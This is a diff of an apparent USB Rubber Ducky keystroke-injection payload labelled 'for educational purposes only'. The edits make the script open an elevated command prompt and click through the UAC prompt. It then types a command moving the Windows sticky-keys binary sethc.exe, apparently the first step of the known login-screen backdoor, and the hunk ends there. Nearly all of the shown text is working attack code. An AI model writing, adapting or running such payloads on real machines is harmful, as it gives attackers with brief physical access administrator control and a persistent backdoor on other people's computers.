@@ -5,11 +5,13 @@ REM WARNING: This script is for educational purposes only
 REM Str1ck9
 REM <--------------------------------------------------------------------------->
 
-DELAY 500
 GUI r
-DELAY 1000
+DELAY 500
 STRING cmd
+CTRL-SHIFT ENTER
 DELAY 1000
+SHIFT TAB
+DELAY 500
 ENTER
 DELAY 1000
 STRING move c:\windows\system32\sethc.exe c:\
